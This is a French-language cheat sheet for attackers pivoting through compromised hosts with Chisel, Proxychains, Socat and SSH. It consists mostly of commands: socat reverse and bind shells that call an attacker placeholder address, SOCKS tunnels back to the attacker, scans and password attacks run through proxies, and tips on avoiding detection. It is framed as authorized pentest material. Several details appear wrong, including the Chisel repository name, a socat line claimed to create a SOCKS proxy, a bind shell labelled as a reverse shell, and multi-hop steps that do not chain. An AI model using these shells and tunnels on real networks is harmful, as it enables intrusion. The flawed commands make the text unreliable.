# Pivoting with Chisel, Proxychains and Socat Cheat Sheet

## Overview

Le pivoting est la technique d'utilisation d'un système compromis pour accéder à d'autres systèmes sur le réseau. Ces outils vous aident à :

- Établir des tunnels à travers des hôtes compromis.
- Router le trafic à travers plusieurs sauts.
- Accéder à des réseaux internes depuis l'extérieur.
- Contourner la segmentation réseau.
- Réaliser des évaluations de sécurité autorisées.

**Chisel** : Tunnel TCP/UDP rapide sur HTTP.
**Proxychains** : Forcer les applications à travers des serveurs proxy.
**Socat** : Outil de relais polyvalent pour les connexions réseau.

```text
Utilisez ces outils uniquement contre des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite de test.
```

---

# 1. Chisel - Tunnel TCP/UDP sur HTTP

## Overview

Chisel est un tunnel TCP/UDP rapide sur HTTP, sécurisé par SSH. Il est idéal pour :

- Créer des tunnels inverses depuis des hôtes compromis.
- Transférer des ports à travers des firewalls.
- Établir des proxies SOCKS.
- Faire du pivoting à travers plusieurs hôtes.

## Installation

### Installer sur la machine de l'attaquant

```bash
# Télécharger depuis GitHub
wget https://github.com/jpillows/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
gzip -d chisel_1.10.0_linux_amd64.gz
chmod +x chisel
mv chisel /usr/local/bin/
```

### Installer sur la machine cible

Même processus, ou utiliser un binaire statique si la cible n'a pas de gestionnaire de paquets.

## Démarrer le serveur Chisel

### Serveur de base

```bash
chisel server --port 8080 --reverse
```

### Serveur avec authentification

```bash
chisel server --port 8080 --reverse --auth user:password
```

### Serveur avec plusieurs utilisateurs

```bash
chisel server --port 8080 --reverse --auth user1:pass1 --auth user2:pass2
```

### Serveur avec logging

```bash
chisel server --port 8080 --reverse --log-level debug
```

## Démarrer le client Chisel

### Client de base (tunnel inversé)

```bash
chisel client http://<server-ip>:8080 R:socks
```

Cela crée un proxy SOCKS du côté du serveur.

### Client avec transfert de port spécifique

```bash
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389
```

Transfère RDP depuis 192.168.1.10 à travers le tunnel.

### Client avec plusieurs transferts

```bash
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389 R:22:192.168.1.20:22
```

### Client avec authentification

```bash
chisel client http://user:password@<server-ip>:8080 R:socks
```

### Client en mode foreground

```bash
chisel client http://<server-ip>:8080 R:socks --foreground
```

## Scénarios communs avec Chisel

### Créer un proxy SOCKS à travers un hôte compromis

**Sur la machine de l'attaquant (serveur) :**

```bash
chisel server --port 8080 --reverse
```

**Sur l'hôte compromis (client) :**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Utiliser le proxy avec proxychains :**

```bash
proxychains nmap -sT 192.168.1.0/24
```

### Transférer un port spécifique

**Sur la machine de l'attaquant :**

```bash
chisel server --port 8080 --reverse
```

**Sur l'hôte compromis :**

```bash
chisel client http://<attacker-ip>:8080 R:3306:192.168.1.50:3306
```

Maintenant, connectez-vous à localhost:3306 pour atteindre MySQL sur 192.168.1.50.

### Pivoting multi-sauts

**Premier saut :**

```bash
# Sur le premier hôte compromis
chisel client http://<attacker-ip>:8080 R:socks
```

**Deuxième saut à travers le premier :**

```bash
# Sur le deuxième hôte compromis
chisel client http://<attacker-ip>:8080 R:socks
```

### Reverse shell à travers Chisel

**Sur la machine de l'attaquant :**

```bash
chisel server --port 8080 --reverse
```

**Sur l'hôte compromis :**

```bash
chisel client http://<attacker-ip>:8080 R:4444:127.0.0.1:4444
```

Puis démarrez un listener netcat sur l'attaquant.

---

# 2. Proxychains - Forcer les applications à travers un proxy

## Overview

Proxychains force les applications à utiliser des serveurs proxy (SOCKS4, SOCKS5, HTTP). Il est idéal pour :

- Router le trafic à travers des hôtes compromis.
- Contourner les restrictions réseau.
- Cacher votre véritable adresse IP.
- Faire du pivoting à travers plusieurs proxies.

## Installation

### Installer sur Debian/Ubuntu

```bash
sudo apt update
sudo apt install proxychains -y
```

### Installer depuis le code source

```bash
git clone https://github.com/haad/proxychains.git
cd proxychains/proxychains
./configure
make
sudo make install
```

## Configuration

### Éditer le fichier de configuration

```bash
sudo nano /etc/proxychains/proxychains.conf
```

### Configuration de base

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

### Plusieurs proxies (chaîne)

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
http 192.168.1.20 8080
```

### Activer la protection contre les fuites DNS

```ini
proxy_dns
```

Ajoutez ceci avant la section [ProxyList].

### Activer le mode quiet

```ini
quiet_mode
```

Réduit la verbosité de la sortie.

## Utilisation de Proxychains

### Utilisation de base

```bash
proxychains <command>
```

Exemple :

```bash
proxychains nmap -sT 192.168.1.10
```

### Forcer proxychains

```bash
proxychains -f <config-file> <command>
```

Exemple :

```bash
proxychains -f /etc/proxychains/proxychains.conf nmap -sT 192.168.1.10
```

### Avec le proxy SOCKS de Chisel

**Démarrer Chisel :**

```bash
chisel client http://<server-ip>:8080 R:socks
```

**Utiliser avec proxychains :**

```bash
proxychains nmap -sT 192.168.1.0/24
```

### Commandes courantes avec proxychains

```bash
# Scan Nmap
proxychains nmap -sT 192.168.1.10

# Connexion SSH
proxychains ssh user@192.168.1.10

# Requête Curl
proxychains curl http://192.168.1.10

# Metasploit
proxychains msfconsole

# SQLMap
proxychains sqlmap -u http://192.168.1.10/vuln.php?id=1

# WPScan
proxychains wpscan -u http://192.168.1.10/

# Hydra
proxychains hydra -L users.txt -P passwords.txt 192.168.1.10 ssh
```

## Exemples de configuration Proxychains

### Proxy SOCKS5 unique

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

### SOCKS5 avec authentification

```ini
[ProxyList]
socks5 127.0.0.1 1080 user password
```

### Proxy HTTP

```ini
[ProxyList]
http 127.0.0.1 8080
```

### Plusieurs proxies en chaîne

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
http 192.168.1.20 8080
```

### Chaîne aléatoire

```ini
chain_len = 2
random_chain
```

---

# 3. Socat - Relais réseau polyvalent

## Overview

Socat (SOcket CAT) est un outil de relais polyvalent pour les connexions réseau. Il est idéal pour :

- Le transfert de ports.
- Créer des reverse shells.
- Ponts de connexions réseau.
- Conversion entre protocoles.
- Faire du pivoting à travers des hôtes compromis.

## Installation

### Installer sur Debian/Ubuntu

```bash
sudo apt update
sudo apt install socat -y
```

### Installer sur CentOS/RHEL

```bash
sudo yum install socat -y
```

### Installer sur macOS

```bash
brew install socat
```

## Utilisation de base de Socat

### Écouter sur un port

```bash
socat TCP-LISTEN:4444 -
```

### Se connecter à un port

```bash
socat TCP:<target-ip>:4444 -
```

### Transférer un port vers un autre port

```bash
socat TCP-LISTEN:8080 TCP:<target-ip>:80
```

### Transférer avec exec

```bash
socat TCP-LISTEN:4444 EXEC:/bin/bash
```

## Socat pour le pivoting

### Créer un reverse shell

**Sur la machine de l'attaquant :**

```bash
socat TCP-LISTEN:4444 -
```

**Sur l'hôte compromis :**

```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```

### Transfert de ports à travers un hôte compromis

**Sur l'hôte compromis :**

```bash
socat TCP-LISTEN:8080 TCP:192.168.1.50:80
```

Maintenant, connectez-vous à compromised-host:8080 pour atteindre 192.168.1.50:80.

### Créer un proxy SOCKS

**Sur l'hôte compromis :**

```bash
socat TCP-LISTEN:1080 SOCKS:192.168.1.50:80
```

### Transfert bidirectionnel

**Sur l'hôte compromis :**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80
```

Les options `reuseaddr,fork` permettent plusieurs connexions.

### Pont UDP vers TCP

```bash
socat UDP-LISTEN:53 TCP:192.168.1.50:53
```

### Tunnel SSL/TLS

**Côté serveur :**

```bash
socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=server.pem,key=server.key TCP:192.168.1.50:80
```

**Côté client :**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork OPENSSL:<server-ip>:443,verify=0
```

## Scénarios communs avec Socat

### Reverse shell avec socat

**Sur l'attaquant :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork -
```

**Sur la cible :**

```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```

### Bind shell avec socat

**Sur la cible :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

**Se connecter depuis l'attaquant :**

```bash
socat TCP:<target-ip>:4444 -
```

### Transfert de ports à travers plusieurs sauts

**Premier saut :**

```bash
socat TCP-LISTEN:8080 TCP:<first-hop>:9090
```

**Deuxième saut :**

```bash
socat TCP-LISTEN:9090 TCP:<second-hop>:80
```

### Transfert de fichiers avec socat

**Récepteur :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork OPEN:received_file,creat,trunc
```

**Émetteur :**

```bash
socat TCP:<receiver-ip>:4444 OPEN:file_to_send
```

### Tunnel de base de données

**Sur l'hôte compromis :**

```bash
socat TCP-LISTEN:3307 TCP:192.168.1.50:3306
```

Maintenant, connectez-vous à localhost:3307 pour atteindre MySQL sur 192.168.1.50:3306.

---

# 4. Scénarios de pivoting combinés

## Scénario 1 : Chisel + Proxychains

**Étape 1 : Démarrer le serveur Chisel sur l'attaquant**

```bash
chisel server --port 8080 --reverse
```

**Étape 2 : Se connecter depuis l'hôte compromis**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Étape 3 : Utiliser proxychains avec des outils**

```bash
proxychains nmap -sT 192.168.1.0/24
proxychains ssh user@192.168.1.10
proxychains curl http://192.168.1.10/admin
```

## Scénario 2 : Chisel + Socat

**Étape 1 : Démarrer le serveur Chisel**

```bash
chisel server --port 8080 --reverse
```

**Étape 2 : Créer un tunnel depuis l'hôte compromis**

```bash
chisel client http://<attacker-ip>:8080 R:3307:192.168.1.50:3306
```

**Étape 3 : Utiliser socat pour un transfert supplémentaire**

```bash
socat TCP-LISTEN:3308 TCP:127.0.0.1:3307
```

## Scénario 3 : Multi-sauts avec Chisel

**Premier hôte compromis :**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Deuxième hôte compromis (à travers le premier) :**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Troisième hôte compromis (à travers le deuxième) :**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

## Scénario 4 : Chaîne Proxychains

**Configurer /etc/proxychains/proxychains.conf :**

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
socks5 192.168.1.20 1080
```

**Utiliser avec des outils :**

```bash
proxychains nmap -sT 192.168.1.100
```

## Scénario 5 : Combinaison Socat + Chisel

**Sur le premier hôte compromis :**

```bash
chisel client http://<attacker-ip>:8080 R:8080:192.168.1.50:80
```

**Sur la machine de l'attaquant :**

```bash
socat TCP-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8080
```

---

# 5. Techniques de pivoting avancées

## Transfert de ports dynamique

### Avec Chisel

```bash
chisel client http://<server-ip>:8080 R:dynamic:1080
```

Crée un proxy SOCKS dynamique sur le port 1080.

### Avec SSH

```bash
ssh -D 1080 user@<compromised-host>
```

### Avec Socat

```bash
socat TCP-LISTEN:1080,reuseaddr,fork SOCKS:192.168.1.50:80
```

## Transfert de ports local

### Avec Chisel

```bash
chisel client http://<server-ip>:8080 L:3306:192.168.1.50:3306
```

### Avec SSH

```bash
ssh -L 3306:192.168.1.50:3306 user@<compromised-host>
```

### Avec Socat

```bash
socat TCP-LISTEN:3306,reuseaddr,fork TCP:192.168.1.50:3306
```

## Transfert de ports distant

### Avec Chisel

```bash
chisel client http://<server-ip>:8080 R:8080:192.168.1.50:80
```

### Avec SSH

```bash
ssh -R 8080:192.168.1.50:80 user@<attacker-host>
```

### Avec Socat

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80
```

## Tunneling type VPN

### Avec Chisel

```bash
# Serveur
chisel server --port 8080 --reverse --proxy "http://proxy:8080"

# Client
chisel client http://<server-ip>:8080 R:socks
```

### Avec SSH

```bash
ssh -D 1080 -C user@<compromised-host>
```

L'option `-C` active la compression.

---

# 6. Troubleshooting

## Problèmes Chisel

### Connection refused

- Vérifiez si le serveur est en cours d'exécution.
- Vérifiez que le port n'est pas bloqué par le firewall.
- Assurez-vous que l'adresse IP est correcte.

### Authentication failed

- Vérifiez le username et le mot de passe.
- Vérifiez les erreurs de frappe dans les credentials.
- Assurez-vous que le serveur a la bonne auth configurée.

### Performance lente

- Réduisez la surcharge de chiffrement.
- Vérifiez la latence réseau.
- Utilisez la compression si disponible.

## Problèmes Proxychains

### Timeout de connexion

- Vérifiez que le serveur proxy est en cours d'exécution.
- Vérifiez la configuration du proxy.
- Testez la connectivité du proxy manuellement.

### Fuites DNS

- Activez `proxy_dns` dans la configuration.
- Utilisez `proxychains -f` avec la bonne config.
- Testez avec `proxychains curl ifconfig.me`.

### L'application ne fonctionne pas

- Certaines applications ne fonctionnent pas avec proxychains.
- Essayez `proxychains -d` pour la sortie debug.
- Utilisez la méthode LD_PRELOAD si nécessaire.

## Problèmes Socat

### Address already in use

- Utilisez l'option `reuseaddr`.
- Vérifiez si le port est déjà lié.
- Tuez le processus existant sur le port.

### Connection reset

- Vérifiez que la cible est accessible.
- Vérifiez les règles du firewall.
- Assurez-vous que le service cible est en cours d'exécution.

### Permission denied

- Exécutez avec les privilèges appropriés.
- Vérifiez les politiques SELinux/AppArmor.
- Utilisez des ports non privilégiés (>1024).

---

# 7. Security Best Practices

## Vérifiez toujours les tunnels

- Testez la connectivité à travers les tunnels.
- Vérifiez que les données circulent correctement.
- Surveillez les déconnexions.
- Ayez des méthodes d'accès de secours.

## Minimisez la détection

- Utilisez le chiffrement quand c'est possible.
- Évitez les scans bruyants à travers les tunnels.
- Utilisez un timing approprié.
- Nettoyez après les tests.

## Maintenez la stabilité

- Utilisez des connexions persistantes.
- Implémentez une logique de reconnexion.
- Surveillez la santé des tunnels.
- Ayez des options de repli.

## Documentez tout

- Enregistrez les configurations de tunnel.
- Notez quels hôtes sont compromis.
- Suivez la topologie réseau.
- Documentez les résultats et méthodes.

---

# 8. Important Reminders

- Obtenez toujours une autorisation explicite avant de faire du pivoting.
- Testez d'abord dans des environnements de laboratoire contrôlés.
- Certaines techniques peuvent déclencher des alertes de sécurité.
- Respectez les limites et politiques réseau.
- Maintenez les outils à jour régulièrement.
- Validez les résultats manuellement.
- Documentez toutes les actions et configurations.
- Préservez les preuves originales et les logs.
- Comprenez les implications légales et éthiques.
- Nettoyez les tunnels après les tests.

---

# 9. Quick Reference Commands

## Chisel

```bash
# Démarrer le serveur
chisel server --port 8080 --reverse

# Démarrer le client avec SOCKS
chisel client http://<server-ip>:8080 R:socks

# Démarrer le client avec transfert de port
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389
```

## Proxychains

```bash
# Utilisation de base
proxychains <command>

# Nmap à travers un proxy
proxychains nmap -sT 192.168.1.10

# SSH à travers un proxy
proxychains ssh user@192.168.1.10
```

## Socat

```bash
# Écouter sur un port
socat TCP-LISTEN:4444 -

# Transférer un port
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80

# Reverse shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

---

# 10. Additional Resources

## Chisel

```text
https://github.com/jpillows/chisel
```

## Proxychains

```text
https://github.com/haad/proxychains
```

## Socat

```text
http://www.dest-unreach.org/socat/
```

## Guide de pivoting

```text
https://www.offensive-security.com/
```

## Techniques de Network Pivoting

```text
https://www.sans.org/
```
